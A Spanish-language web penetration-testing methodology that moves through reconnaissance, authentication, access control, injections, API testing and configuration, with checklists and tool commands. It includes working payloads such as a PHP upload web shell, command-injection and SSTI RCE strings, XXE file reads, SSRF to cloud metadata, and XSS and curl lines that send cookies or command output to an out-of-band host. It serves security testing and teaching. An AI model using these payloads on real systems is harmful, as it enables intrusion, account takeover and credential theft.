---
icon: arrow-progress
---

# Metodología — Hacking Web Completo

### Filosofía

Esta metodología cubre desde el reconocimiento inicial hasta la explotación avanzada de forma secuencial y acumulativa: lo que aprendes en cada fase alimenta la siguiente. No saltes fases — un parámetro descubierto en reconocimiento puede ser el vector de un RCE en inyecciones.

```
Regla de oro:
Enumerar primero, explotar después.
Un mapa completo de la aplicación vale más que
explotar el primer vector que encuentres.
```

### Preparación del entorno — Antes de empezar

```
BURP SUITE:
□ Proxy activo y certificado CA instalado en el navegador
□ Scope configurado: Target → Scope → añadir el dominio objetivo
□ Extensions instaladas:
    → Autorize        (BAC automático — imprescindible)
    → JWT Editor      (si hay JWT)
    → Param Miner     (parámetros y cabeceras ocultos)
    → InQL            (si hay GraphQL)
    → 403 Bypasser    (bypass de 403 automático)

CUENTAS DE PRUEBA:
□ Registrar MÍNIMO dos cuentas:
    → attacker@test.com   → cuenta del atacante (bajo privilegio)
    → victim@test.com     → cuenta víctima (mismo o mayor privilegio)
□ Si hay roles múltiples: una cuenta por cada rol disponible
□ Guardar los tokens/cookies de cada cuenta para usarlos en Autorize

OOB LISTENER (para blind injections):
□ Iniciar Interactsh:
    interactsh-client -v
    → Guardar la URL generada: abc123.oast.fun
□ Alternativa: Burp Collaborator (Pro)

TERMINAL:
□ ffuf, gobuster, nuclei, sqlmap, nmap listos
□ Wordlists:
    /usr/share/seclists/Discovery/Web-Content/common.txt
    /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
    /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
    /usr/share/seclists/Discovery/Web-Content/api/api-seen-in-wild.txt
```

### FASE 1 — Reconocimiento Pasivo

**Objetivo:** recopilar información sin interactuar directamente con el objetivo.

#### 1.1 — Fingerprinting tecnológico

```bash
# Identificar tecnologías del objetivo
whatweb https://target.com -v
wappalyzer  # (extensión del navegador)

# Cabeceras HTTP reveladoras
curl -I https://target.com
# Buscar: Server, X-Powered-By, X-Generator, Set-Cookie (nombre)
# PHPSESSID → PHP | JSESSIONID → Java | ASP.NET_SessionId → .NET

# Certificado SSL → puede revelar subdominios en el SAN
openssl s_client -connect target.com:443 </dev/null 2>/dev/null | \
    openssl x509 -noout -text | grep DNS:
```

#### 1.2 — Enumeración de subdominios

```bash
# Pasivo — sin tocar el objetivo
subfinder -d target.com -o subdominios.txt
amass enum -passive -d target.com
assetfinder target.com

# Certificate Transparency (CT logs)
curl "https://crt.sh/?q=%.target.com&output=json" | \
    python3 -m json.tool | grep name_value | sort -u

# DNS brute force
dnsx -d target.com \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    -o subdominios_resueltos.txt

# Resolver y verificar cuáles están activos
cat subdominios.txt | httpx -o activos.txt -title -tech-detect -status-code
```

#### 1.3 — Reconocimiento de URLs históricas

```bash
# Wayback Machine / gau → URLs históricas (revelan endpoints antiguos)
echo "target.com" | gau --threads 5 | tee urls_historicas.txt
waybackurls target.com >> urls_historicas.txt

# Filtrar por tipo de contenido interesante
cat urls_historicas.txt | grep -E "\.(php|aspx|jsp|json|xml|env|config|bak|sql|zip)" | sort -u
cat urls_historicas.txt | grep -E "[?&](id|user|file|path|url|token|key)=" | sort -u
# Los parámetros históricos son candidatos a IDOR, SQLi, SSRF

# Buscar APIs en las URLs históricas
cat urls_historicas.txt | grep "/api/" | sort -u
```

#### 1.4 — Google Dorks

```bash
# Buscar páginas de login, paneles admin, archivos sensibles
site:target.com inurl:admin
site:target.com inurl:login
site:target.com ext:php inurl:?id=
site:target.com filetype:env
site:target.com filetype:sql
site:target.com "index of /"

# Buscar secretos en GitHub
site:github.com "target.com" "api_key"
site:github.com "target.com" "password"
site:github.com "target.com" ".env"

# Buscar Postman collections públicas
site:postman.com "target.com"
```

#### 1.5 — OSINT adicional

```bash
# Emails y empleados (pueden revelar tecnologías o ser usados en spraying)
theHarvester -d target.com -b all

# Shodan — servicios expuestos
shodan search "hostname:target.com" --fields ip_str,port,org,product
# Buscar: paneles admin, versiones antiguas, servicios internos expuestos

# Información WHOIS — rangos IP, ASN
whois target.com
```

### FASE 2 — Reconocimiento Activo

**Objetivo:** mapear toda la superficie de ataque interactuando directamente con la aplicación.

#### 2.1 — Navegación manual con Burp activo

```
□ Navegar TODA la aplicación con Burp Proxy activo
□ Con cada cuenta registrada: explorar todas las secciones
□ Hacer clic en cada botón, formulario y enlace
□ Objetivo: que Burp capture TODOS los endpoints posibles
□ Target → Site Map → revisar el árbol de URLs capturadas
```

#### 2.2 — Fuzzing de directorios y archivos

```bash
# Directorios ocultos
ffuf -u https://target.com/FUZZ \
    -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
    -mc 200,301,302,403 -c -t 50

# Archivos con extensiones específicas según la tecnología detectada
ffuf -u https://target.com/FUZZ \
    -w /usr/share/seclists/Discovery/Web-Content/common.txt \
    -e .php,.bak,.old,.sql,.zip,.tar.gz,.log,.config,.env \
    -mc 200,301,302,403

# Archivos sensibles comunes
ffuf -u https://target.com/FUZZ \
    -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt \
    -mc 200

# Anotar todos los 403 → intentar bypass en Fase 6
```

#### 2.3 — Análisis del JavaScript

```bash
# Descargar todo el JS del sitio
# DevTools → Sources → clic derecho en cada .js → Save as

# Buscar endpoints, tokens y secretos
grep -rE "(fetch|axios|http|/api/|endpoint)" --include="*.js" . | sort -u
grep -rE "(api_key|apikey|token|secret|password|Bearer|Authorization)" --include="*.js" .
grep -rE "\"[/a-zA-Z0-9_-]+\"" --include="*.js" . | grep "/" | sort -u | head -100

# Herramientas automáticas
python3 linkfinder.py -i https://target.com -d  # descubre endpoints en JS
secretfinder.py -i https://target.com -e         # busca secretos en JS
```

#### 2.4 — Descubrimiento de API

```bash
# Buscar documentación expuesta
for endpoint in swagger.json swagger.yaml api-docs openapi.json v1/api-docs \
                v2/api-docs v3/api-docs swagger-ui.html graphql graphiql; do
    curl -s -o /dev/null -w "%{http_code} $endpoint\n" \
        https://target.com/$endpoint
done

# Fuzzing específico de rutas de API
ffuf -u https://target.com/api/FUZZ \
    -w /usr/share/seclists/Discovery/Web-Content/api/api-seen-in-wild.txt \
    -mc 200,201,401,403 -c

# Versiones de API
ffuf -u https://target.com/api/FUZZ/users \
    -w <(echo -e "v1\nv2\nv3\nv0\nbeta\nalpha\nlegacy\nold\ndev") \
    -mc 200,401,403

# Kiterunner para descubrimiento masivo de rutas API
kr scan https://target.com -w routes-large.kite -x 20
```

#### 2.5 — Mapeo de parámetros

```bash
# Descubrir parámetros ocultos en endpoints conocidos
# Con Param Miner (Burp) → clic derecho en petición → Guess params

# Con Arjun (especialmente útil para APIs)
arjun -u https://target.com/api/users -m GET
arjun -u https://target.com/api/users -m POST
arjun -u https://target.com/search -m GET

# Anotar TODOS los parámetros descubiertos:
# Nombre del parámetro | Tipo (GET/POST/Header/Cookie/JSON) | Endpoint
```

#### 2.6 — Inventario final

```
Al terminar esta fase debes tener documentado:
□ Tecnologías: lenguaje, framework, servidor, base de datos (si se puede inferir)
□ Subdominios activos
□ Todos los endpoints (URLs + métodos HTTP)
□ Todos los parámetros de entrada por endpoint
□ Esquema de autenticación (sesión, JWT, API key, OAuth...)
□ Roles disponibles
□ Funcionalidades interesantes:
   → Upload de archivos
   → Exportación de datos
   → Webhooks
   → Importación desde URL externa
   → Funciones de ping/diagnóstico
   → Generación de PDFs
   → Procesamiento de imágenes
   → Templates personalizables
```

### FASE 3 — Autenticación y Gestión de Sesiones

#### 3.1 — Mecanismo de login

```
□ Credenciales por defecto: admin/admin, admin/password, test/test, guest/guest
□ SQL injection en el campo de usuario:
    → admin'--
    → ' OR '1'='1'--
    → admin'/*
    → Si hay error SQL o acceso → SQLi en login
□ Mensajes de error diferenciados:
    → "Usuario no existe" vs "Contraseña incorrecta" → enumeración de usuarios
□ Bruteforce sin rate limiting:
    → Enviar 50 peticiones de login → ¿hay 429 o lockout?
    → Si no: hydra / Burp Intruder con rockyou.txt
□ Registro de cuenta:
    → ¿Acepta email ya existente con distinta capitalización? (user@test.COM)
    → ¿Se puede registrar como admin@target.com? (sin verificación de dominio)
    → ¿El email de verificación es obligatorio? → intentar acceder sin verificar
```

#### 3.2 — Tokens de sesión

```
□ Analizar la cookie de sesión:
    → ¿Tiene flags HttpOnly, Secure, SameSite?
    → Decodificar: echo "COOKIE" | base64 -d → ¿contiene datos predecibles?
    → ¿Cambia tras login? (session fixation si no cambia)

□ Si hay JWT:
    python3 jwt_tool.py TOKEN -M pb \
        -t https://target.com/api/me \
        -rh "Authorization: Bearer TOKEN"
    → Ataques automáticos: alg:none, weak secret, RS256→HS256, kid injection
    → Si usa HS256: hashcat -m 16500 token.txt rockyou.txt
    → ¿Tiene exp? → probar con token expirado
    → ¿Tiene rol en el payload? → modificar rol + re-firmar
```

#### 3.3 — Recuperación de contraseña

```
□ Solicitar reset para tu propia cuenta → analizar el token:
    → ¿Es predecible? (timestamp, MD5(email), secuencial)
    → ¿Expira? → esperar N minutos y probar
    → ¿Se puede usar una vez usado? (token reusable)
□ Host Header Injection:
    → Cambiar header Host: attacker.com en la petición de reset
    → ¿El email llega con el dominio del atacante? → capturar tokens de víctimas
□ Parámetro de email duplicado:
    POST /forgot-password
    {"email": "victim@test.com", "email": "attacker@test.com"}
    → Algunos backends usan el segundo valor
□ Token de reset de otra cuenta en la URL de reset de la víctima
```

#### 3.4 — 2FA/MFA

```
□ Saltar 2FA: tras el login, ir directamente a /dashboard sin pasar por /2fa
□ Bruteforce del código:
    → 4 dígitos = 10.000 posibilidades / 6 dígitos = 1.000.000
    → ¿Hay rate limiting? → si no: Burp Intruder
□ Manipulación de respuesta:
    → En Burp, interceptar la respuesta al enviar OTP incorrecto
    → Cambiar "success":false por "success":true
    → O cambiar el código de respuesta de 401 a 200
□ Reutilización del código OTP (¿expira? ¿solo se puede usar una vez?)
□ Si es TOTP (Google Authenticator): ¿acepta códigos de ventanas de tiempo pasadas?
```

### FASE 4 — Control de Acceso (Broken Access Control)

**Configurar Autorize ahora:** pegar el token de la cuenta de bajo privilegio.

#### 4.1 — IDOR / BOLA

```
□ Para CADA parámetro con ID numérico o UUID:
    → Con tu cuenta (ID 1042): GET /api/users/1042 → funciona
    → Con tu cuenta: GET /api/users/1043 → ¿funciona? → IDOR

□ Probar IDs especiales:
    → 1 (admin suele ser el primero)
    → 0 y -1
    → ID ± 1 del tuyo

□ IDOR en métodos escritura:
    PUT  /api/users/1043 {"email": "attacker@evil.com"}
    DELETE /api/posts/ID_VICTIMA
    PATCH /api/orders/ID_VICTIMA {"status": "cancelled"}

□ IDOR en el body de la petición (no solo en la URL):
    POST /api/messages/send
    {"user_id": 1043, "message": "hola"}   ← añadir user_id de otro

□ IDOR en cabeceras custom:
    X-User-Id: 1043
    X-Account-Id: ACC001

□ IDOR entre versiones de API:
    /api/v2/users/1043 → 403
    /api/v1/users/1043 → 200  ← versión antigua sin control
```

#### 4.2 — Escalada vertical

```
□ Acceder a rutas de admin directamente con cuenta normal:
    /admin, /admin/, /panel, /manage, /dashboard/admin, /api/admin/users
    → Probar bypass de 403 si hay respuesta 403:
        X-Original-URL: /admin
        X-Rewrite-URL: /admin
        X-Forwarded-For: 127.0.0.1
        /admin/ → /Admin/ → /%2fadmin/ → /admin;/ → /admin?

□ Mass assignment — añadir campos de privilegio en registro/actualización:
    {"email":"x@x.com","password":"pass","role":"admin","is_admin":true}

□ Cambiar el rol en la respuesta con Burp (Intercept Response):
    {"token":"...","role":"user"} → cambiar "user" por "admin"
    → Si la app usa este valor sin revalidar en el servidor → escalada

□ Parámetros de rol en el body:
    POST /api/settings
    {"theme":"dark","role":"admin"}   ← añadir campo role
```

#### 4.3 — CSRF

```
□ Para cada acción crítica (cambiar email, contraseña, añadir 2FA, transferir):
    → Eliminar el token CSRF de la petición → ¿funciona?
    → Poner el token vacío → ¿funciona?
    → Usar token CSRF de tu otra sesión (test de vinculación token-sesión)
□ Si la acción usa GET → CSRF trivial: <img src="https://target.com/action?param=val">
□ Si usa JSON Content-Type:
    → Probar Content-Type: text/plain con el JSON en el body
    → Crear PoC HTML con fetch + credentials:'include'
□ Verificar flags de cookie SameSite → si no tiene → CSRF clásico posible
```

#### 4.4 — File Upload

```
□ Subir archivo .php directamente
□ Si bloqueado por Content-Type: cambiar a image/jpeg manteniendo extensión .php
□ Extensiones alternativas: .phtml, .phar, .php5, .php7, .pHp
□ Subir archivo con magic bytes JPEG + código PHP:
    python3 -c "print('\xff\xd8\xff\xe0' + '<?php system(\$_GET[cmd]); ?>')" > shell.php
□ Subir .htaccess para mapear extensión arbitraria a PHP
□ Si el servidor procesa imágenes con ImageMagick: probar ImageTragick
□ Race condition si el archivo se valida y elimina: subir + acceder en paralelo
□ Después de subir: determinar dónde queda el archivo y acceder a él
```

### FASE 5 — Inyecciones

**Para cada punto de entrada del inventario de Fase 2, probar en este orden:**

#### 5.1 — SQL Injection

```bash
# Detección básica
'          → ¿error SQL?
''         → ¿error desaparece?
' OR '1'='1'--    → ¿acceso o más resultados?
1 AND SLEEP(5)--  → ¿tarda 5 segundos? (blind time-based)

# Si hay error o comportamiento diferente: confirmar con sqlmap
sqlmap -r request.txt --level=2 --risk=1 --batch

# Si blind: sqlmap con técnica time-based
sqlmap -r request.txt --technique=T --level=3 --batch

# Notas:
# → Probar también en cabeceras: User-Agent, Referer, X-Forwarded-For
# → En cookies: cambiar el valor de la cookie
# → En campos JSON: "id": "1'"
```

#### 5.2 — NoSQL Injection (MongoDB)

```
Si la app usa MongoDB (Node.js + Express, Python + Flask...):

□ En JSON body:
    {"password": {"$ne": ""}}          → bypass de autenticación
    {"password": {"$gt": ""}}
    {"username": {"$regex": "admin"}}  → enumeración

□ En URL params:
    ?password[$ne]=
    ?username[$regex]=admin

□ Time-based (blind):
    {"$where": "sleep(5000) || 1==1"}
```

#### 5.3 — Command Injection

```
Buscar en: campos de ping/nslookup/traceroute, conversión de archivos,
           procesamiento de imágenes, nombres de archivo al subir

; id
| id
&& id
`id`
$(id)
; sleep 5    → confirmar blind

OOB: ; curl http://abc123.oast.fun/$(whoami)

Bypass de filtros si hay:
→ ${IFS} en lugar de espacio
→ c'a't en lugar de cat
→ /bin/c?t en lugar de /bin/cat
```

#### 5.4 — SSTI

```
Buscar en: cualquier campo que se renderice/refleje en la respuesta,
           templates de email, mensajes personalizados, nombres de perfil

{{7*7}}      → 49?  → Jinja2 o Twig
${7*7}       → 49?  → Freemarker, Mako, Velocity
<%= 7*7 %>   → 49?  → ERB
*{7*7}       → 49?  → Thymeleaf

Si da 49:
    {{7*'7'}} → 7777777 = Jinja2 → {{cycler.__init__.__globals__.os.popen('id').read()}}
    {{7*'7'}} → 49      = Twig   → {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

Blind SSTI: {{cycler.__init__.__globals__.os.popen('curl http://abc123.oast.fun').read()}}
```

#### 5.5 — XXE

```
Buscar en: peticiones con XML en el body, subida de DOCX/XLSX/SVG,
           endpoints SOAP, SAMLResponse en SSO

□ Básico (si hay output):
    <?xml version="1.0"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <root>&xxe;</root>

□ SSRF vía XXE:
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

□ Blind XXE (OOB):
    <!DOCTYPE foo [<!ENTITY % r SYSTEM "http://abc123.oast.fun/xxe">%r;]>
    <root/>

□ XInclude (cuando no se puede controlar el DOCTYPE completo):
    <x xmlns:xi="http://www.w3.org/2001/XInclude">
        <xi:include href="file:///etc/passwd" parse="text"/>
    </x>
```

#### 5.6 — SSRF

```
Buscar en: parámetros url=, src=, href=, fetch=, callback=, redirect=,
           generación de PDFs, webhooks, importación desde URL, link preview

□ Básico:
    url=http://127.0.0.1/
    url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

□ Confirmar blind:
    url=http://abc123.oast.fun

□ Si hay filtros, probar representaciones alternativas:
    url=http://2130706433/      (127.0.0.1 en decimal)
    url=http://[::1]/           (IPv6 loopback)
    url=http://0/
    url=http://localhost.attacker.com/  (DNS → 127.0.0.1)

□ Escalar si hay cloud:
    url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
    → Obtener credenciales IAM → aws sts get-caller-identity
```

#### 5.7 — XSS

```
Buscar en: cualquier campo reflejado en la respuesta

□ Prueba básica en contexto HTML:
    <script>alert(document.domain)</script>
    <img src=x onerror=alert(1)>
    <svg onload=alert(1)>

□ En contexto de atributo:
    " onmouseover="alert(1)
    "><img src=x onerror=alert(1)>

□ En contexto JS (campo dentro de <script>):
    ";alert(1)//
    </script><script>alert(1)</script>

□ DOM XSS: inspeccionar el JS → ¿usa location.hash/search en innerHTML o eval?

□ Si hay filtros:
    → Mayúsculas: <ScRiPt>alert(1)</ScRiPt>
    → Sin script: <img src=x onerror=alert(1)>
    → Encoding: <img src=x onerror=alert&#40;1&#41;>

□ Si hay output: escalar a robo de cookie/token:
    <script>fetch('https://abc123.oast.fun/?c='+document.cookie)</script>
```

#### 5.8 — LDAP / XPath / Header Injections

```
LDAP (en formularios de login con directorio):
    → * en el campo usuario → ¿accede como cualquier usuario?

CRLF (en parámetros que se reflejan en cabeceras):
    ?lang=es%0d%0aSet-Cookie:%20session=evil
    → ¿Aparece Set-Cookie en la respuesta?

Host Header (en formularios de reset, caché):
    → Cambiar Host: attacker.com
    → ¿Afecta a los links generados o a la caché?
```

### FASE 6 — Seguridad de API (OWASP API Top 10)

**Solo si hay API REST/GraphQL identificada en Fase 2.**

#### 6.1 — Autorización en API (API1 + API5)

```
□ Configurar Autorize con el token de la cuenta de bajos privilegios
□ Navegar la app con la cuenta de altos privilegios
□ Analizar resultados de Autorize: columna "Authz: Bypassed!"

□ Manual: para cada endpoint de la API con ID:
    GET /api/v1/users/ID_VICTIMA          → con TOKEN_ATACANTE
    PUT /api/v1/users/ID_VICTIMA          → modificar datos
    DELETE /api/v1/orders/ID_VICTIMA      → borrar recursos ajenos

□ Endpoints de admin accesibles:
    /api/admin/users, /api/admin/reports, /api/management/config
    → Con token de usuario normal

□ Versiones antiguas sin controles:
    /api/v1/ vs /api/v2/ → probar los mismos endpoints en v1
```

#### 6.2 — Autenticación API (API2)

```
□ JWT: ya cubierto en Fase 3.2
□ API keys en el JS o en repositorios Git:
    grep -r "api_key\|apikey\|Authorization" --include="*.js" .
    trufflehog git https://github.com/target/repo
□ Rate limiting en login de API:
    for i in $(seq 1 50); do
        curl -s -X POST https://target.com/api/auth/login \
            -d '{"email":"test@test.com","password":"wrong"}' | head -1
    done
    → ¿Hay 429 en algún momento?
□ Tokens sin expiración: decodificar JWT → ¿tiene campo "exp"?
```

#### 6.3 — Mass Assignment y Data Exposure (API3)

```
□ En cada endpoint PUT/POST/PATCH de la API:
    → Añadir campos extra al JSON: role, is_admin, admin, verified,
      balance, credits, plan, permissions, two_factor_enabled
    → Ver si alguno cambia el comportamiento

□ Descubrir campos con Arjun:
    arjun -u https://target.com/api/users/1042 --method PUT \
        -H "Authorization: Bearer TOKEN"

□ Revisar respuestas GET de la API:
    → ¿Hay campos sensibles que no se usan en la UI?
    → password_hash, api_key, token, secret, ssn, credit_card, 2fa_secret
    → Estos campos no deberían estar en la respuesta aunque no se muestren
```

#### 6.4 — Rate Limiting y Business Logic (API4 + API6)

```
□ Endpoints sin rate limiting:
    → Login, registro, reset de contraseña, verificación OTP
    → Enviar 100 peticiones → ¿hay 429?

□ Bruteforce de OTP (si no hay rate limiting):
    for code in $(seq -f "%06g" 0 999999); do
        r=$(curl -s -X POST https://target.com/api/auth/otp \
            -d "{\"code\":\"$code\"}" | jq -r '.success')
        [ "$r" = "true" ] && echo "OTP: $code" && break
    done

□ Race conditions en operaciones económicas:
    → Enviar 20 peticiones simultáneas para canjear el mismo cupón
    → Enviar 20 peticiones simultáneas para la misma transferencia
    python3 -c "
import requests, concurrent.futures
h = {'Authorization': 'Bearer TOKEN'}
f = lambda _: requests.post('https://target.com/api/coupon/apply',
    headers=h, json={'code': 'DISCOUNT50'})
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
    r = list(ex.map(f, range(20)))
print([x.status_code for x in r])
"
```

#### 6.5 — GraphQL (si existe)

```
□ Verificar introspección habilitada:
    {"query": "{__schema{types{name}}}"}
    → Si devuelve tipos → introspección activa = schema completo expuesto

□ Auditoría automática:
    graphql-cop -t https://target.com/graphql -H "Authorization: Bearer TOKEN"

□ BOLA en queries:
    {"query": "{ user(id: 1043) { email phone creditCards { number } } }"}

□ Batching para bypass de rate limiting:
    [
        {"query": "mutation { verifyOTP(code: \"000001\") { token } }"},
        {"query": "mutation { verifyOTP(code: \"000002\") { token } }"},
        ...100 más
    ]

□ Nested queries para DoS:
    {"query": "{ users { orders { items { product { category { products { orders { ... } } } } } } } }"}
```

#### 6.6 — Misconfiguration de API (API8 + API9)

```
□ CORS:
    curl -H "Origin: https://attacker.com" -I https://target.com/api/users/me
    → ¿Access-Control-Allow-Origin: https://attacker.com + Allow-Credentials: true?

□ Swagger/documentación expuesta en producción:
    /swagger-ui.html, /api-docs, /openapi.json → si responde = hallazgo

□ Actuator (Spring Boot APIs):
    /actuator/env → variables de entorno con contraseñas en claro
    /actuator/dump → heap dump (puede contener credenciales)

□ Versiones antiguas de API:
    /api/v0/, /api/v1/, /api/beta/, /api/legacy/
    → Comparar controles de seguridad entre versiones
```

### FASE 7 — Fallos Criptográficos y Configuración

#### 7.1 — Cabeceras de seguridad

```bash
curl -I https://target.com | grep -i \
    "strict-transport\|content-security\|x-frame\|x-content-type\|referrer-policy"

# Cabeceras que deberían estar presentes:
# Strict-Transport-Security: max-age=31536000
# Content-Security-Policy: default-src 'self'...
# X-Frame-Options: DENY o SAMEORIGIN (o frame-ancestors en CSP)
# X-Content-Type-Options: nosniff
# Referrer-Policy: no-referrer o same-origin
```

#### 7.2 — TLS y cifrado

```bash
testssl.sh --fast https://target.com
# Buscar: TLS 1.0/1.1 activo, SSLv3, RC4, algoritmos débiles, BEAST, POODLE
```

#### 7.3 — Exposición de datos sensibles

```bash
# Respuestas en caché
curl -H "Cache-Control: no-cache" https://target.com/api/users/me
# ¿La respuesta tiene Cache-Control: no-store? Si no → se puede cachear

# Datos sensibles en cookies
# ¿Las cookies tienen Secure y HttpOnly?
# ¿Los tokens van en URL en lugar de en body?

# Archivos de configuración y backup
for f in .env .env.local config.php settings.py wp-config.php \
          database.yml secrets.yml application.properties; do
    r=$(curl -s -o /dev/null -w "%{http_code}" https://target.com/$f)
    [ "$r" = "200" ] && echo "[!] Expuesto: $f"
done
```

#### 7.4 — CORS y clickjacking

```bash
# Clickjacking
# ¿Falta X-Frame-Options o frame-ancestors en CSP?
# Probar cargar en iframe:
echo '<iframe src="https://target.com/settings" width="800" height="600"></iframe>' > test.html
# Si carga sin error → clickjacking posible

# Open Redirect
for param in url redirect next return goto dest; do
    r=$(curl -s -o /dev/null -w "%{http_code}" \
        "https://target.com/login?$param=http://attacker.com")
    echo "$param → $r"
done
```

### FASE 8 — Componentes Vulnerables y Deserialización

#### 8.1 — CVEs de versiones detectadas

```bash
# Con las versiones identificadas en Fase 2.1:
searchsploit "Apache 2.4.49"
searchsploit "WordPress 5.8"
searchsploit "PHP 7.4"

# Nuclei para CVEs automáticos
nuclei -u https://target.com -t cves/ -severity medium,high,critical

# Versiones específicas de CMS
# WordPress: wpscan --url https://target.com --enumerate vp,vt,u
# Joomla: joomscan --url https://target.com
# Drupal: droopescan scan drupal -u https://target.com
```

#### 8.2 — Deserialización

```
Si la app es PHP y tiene parámetros en base64 o cookies serializadas:
□ Buscar: O:N:"ClassName" al decodificar → objeto PHP serializado
□ phpggc para gadget chains: phpggc -l (ver payloads disponibles)
□ phpggc Laravel/RCE "system" "id"

Si la app es Java y hay parámetros binarios o cabeceras rara:
□ Buscar: \xac\xed\x00\x05 (magic bytes de Java serialization en hex)
□ ysoserial para gadget chains: java -jar ysoserial.jar CommonsCollections5 "id"
□ Interactsh para OOB si no hay output

Si la app es Python:
□ Buscar cookies o parámetros con datos pickle (base64 de \x80\x02...)
□ Crear payload: python3 -c "import pickle,os,base64; print(base64.b64encode(pickle.dumps(os.system('id'))))"
```

### FASE 9 — Lógica de Negocio y Race Conditions

```
□ Identificar operaciones con valor económico o de escasez:
    → Descuentos, cupones, créditos, saldo, stock limitado
    → Períodos de prueba gratuitos, sistemas de referidos

□ Race condition en cualquier operación "verificar + ejecutar":
    → Comprar artículo con saldo insuficiente (enviar en paralelo)
    → Usar cupón de un solo uso múltiples veces
    → Crear dos acciones mutuamente excluyentes simultáneamente
    → Herramienta: Burp Turbo Intruder para enviar N peticiones en el mismo milisegundo

□ Manipulación de precio/cantidad:
    → ¿Se puede modificar el precio en el body de la petición de compra?
    → ¿Se puede poner precio negativo (acredita saldo)?
    → ¿Cantidad 0 o negativa?

□ Flujos en orden incorrecto:
    → ¿Se puede ir a /checkout/confirm sin pasar por /checkout/payment?
    → ¿Se puede ir a /admin/report sin estar logueado?
    → ¿Se puede reutilizar un token de acción única?
```

### FASE 10 — Revisión final y cabos sueltos

```
□ Revisar todos los 403 anotados en Fase 2.2 → intentar bypass
□ Revisar todos los endpoints de la API sin probar
□ Probar los parámetros descubiertos por Arjun/Param Miner
□ Comprobar subdominios activos → ¿tienen el mismo nivel de seguridad?
□ Revisar la caché del navegador y Burp History → ¿algo interesante que no se probó?
□ Probar combinaciones:
    → IDOR en un objeto → extraer token de reset → tomar control de cuenta
    → XSS en perfil → si es stored → robar cookie de admin
    → SSRF → metadata cloud → credenciales → escalar en la infraestructura
    → Mass assignment → dar role:admin → BFLA en panel de admin
□ Ejecutar Nuclei para CVEs en todo lo descubierto:
    nuclei -l targets.txt -t vulnerabilities/ -t cves/ -severity medium,high,critical
```

### Checklist de verificación

```
RECONOCIMIENTO:
□ Subdominios enumerados
□ URLs históricas revisadas
□ JS analizado (endpoints y secretos)
□ API documentación buscada
□ Parámetros inventariados
□ Tecnologías identificadas

AUTENTICACIÓN:
□ Login probado con SQLi y credenciales por defecto
□ Tokens de sesión analizados (JWT si aplica)
□ Reset de contraseña probado
□ 2FA probado (si existe)
□ Rate limiting verificado

AUTORIZACIÓN:
□ Autorize configurado y ejecutado
□ IDOR probado en todos los IDs
□ Escalada vertical probada (/admin, mass assignment, role en respuesta)
□ CSRF probado en acciones críticas
□ File upload probado (si existe)

INYECCIONES:
□ SQLi → todos los parámetros
□ NoSQL → si hay MongoDB
□ Command Injection → campos de diagnóstico y procesamiento
□ SSTI → campos de texto reflejados
□ XXE → peticiones XML y subida de documentos
□ SSRF → parámetros de URL
□ XSS → todos los campos reflejados

API (si aplica):
□ BOLA/BFLA con Autorize
□ JWT attacks con jwt_tool
□ Mass assignment en endpoints PUT/POST
□ Rate limiting en login/OTP/reset
□ Race conditions en operaciones críticas
□ GraphQL auditado con graphql-cop
□ CORS verificado
□ Versiones antiguas de API probadas
□ Actuator/debug endpoints buscados

CONFIGURACIÓN:
□ Cabeceras de seguridad verificadas
□ TLS verificado
□ Datos sensibles en respuestas revisados
□ Archivos de configuración buscados
□ Clickjacking verificado
□ Open redirect probado

COMPONENTES Y LÓGICA:
□ CVEs de versiones buscados
□ Deserialización revisada
□ Lógica de negocio probada
□ Race conditions críticas probadas
```

### Orden de prioridad si el tiempo es limitado

```
Si tienes 2 horas:
1. Reconocimiento básico (30 min) → tecnología, endpoints, JS
2. Autenticación (20 min) → JWT, login bypass, reset
3. IDOR con Autorize (20 min) → configurar y navegar con dos cuentas
4. SQLi en parámetros GET principales (15 min)
5. XSS en campos de búsqueda y perfil (15 min)
6. SSRF en parámetros de URL (10 min)
7. Cabeceras de seguridad (10 min)

Si tienes 1 día:
→ Fases 0-6 completas con todos los checklists

Si tienes una semana:
→ Metodología completa + Nuclei automático + revisión de lógica de negocio profunda
```

> Autorize es el multiplicador más potente de esta metodología: configúralo al inicio de la Fase 4 y déjalo correr mientras navegas. Al terminar tendrás un mapa automático de todos los problemas de autorización sin esfuerzo manual.

> El JS de la aplicación es la mayor fuente de información: endpoints no documentados, tokens hardcodeados, lógica del cliente que revela validaciones del servidor. Siempre dedicar tiempo a analizarlo antes de empezar a probar.

> No saltes directamente a explotar el primer vector que encuentres. Terminar el reconocimiento completo antes de explotar suele revelar rutas de ataque mucho más impactantes que la primera que aparece.
